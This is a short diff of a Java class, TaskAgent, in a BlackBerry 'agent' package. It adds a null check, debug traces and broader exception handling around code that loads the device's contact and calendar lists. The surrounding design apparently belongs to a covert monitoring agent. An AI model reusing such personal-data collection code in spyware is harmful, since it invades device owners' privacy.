@@ -9,7 +9,6 @@
  * *************************************************/
 package blackberry.agent;
 
-import java.io.IOException;
 import java.util.Date;
 import java.util.Enumeration;
 
@@ -160,9 +159,11 @@ public final class TaskAgent extends Agent implements PIMListListener,
             byte[] ret;
             try {
                 ret = markup.readMarkup();
-                haveToLoadContact = ret[0] == 1;
-                haveToLoadCalendar = ret[1] == 1;
-            } catch (IOException ex) {
+                if (ret != null) {
+                    haveToLoadContact = ret[0] == 1;
+                    haveToLoadCalendar = ret[1] == 1;
+                }
+            } catch (Exception ex) {
                 //#ifdef DEBUG
                 debug.error("actualRun: " + ex);
                 //#endif
@@ -170,14 +171,23 @@ public final class TaskAgent extends Agent implements PIMListListener,
         }
 
         if (haveToLoadContact) {
+            //#ifdef DEBUG
+            debug.trace("actualRun: getting Contact List");
+            //#endif
             readSuccesfullyContact = getContactList();
         }
 
         if (haveToLoadCalendar) {
+            //#ifdef DEBUG
+            debug.trace("actualRun: getting Calendar List");
+            //#endif
             readSuccesfullyCalendar = getCalendarList();
         }
 
-        if (readSuccesfullyContact|| readSuccesfullyCalendar) {
+        if (readSuccesfullyContact || readSuccesfullyCalendar) {
+            //#ifdef DEBUG
+            debug.trace("actualRun: need to write markup");
+            //#endif
             markup.writeMarkup(new byte[] {
                     (byte) (readSuccesfullyContact ? 0 : 1),
                     (byte) (readSuccesfullyCalendar ? 0 : 1) });
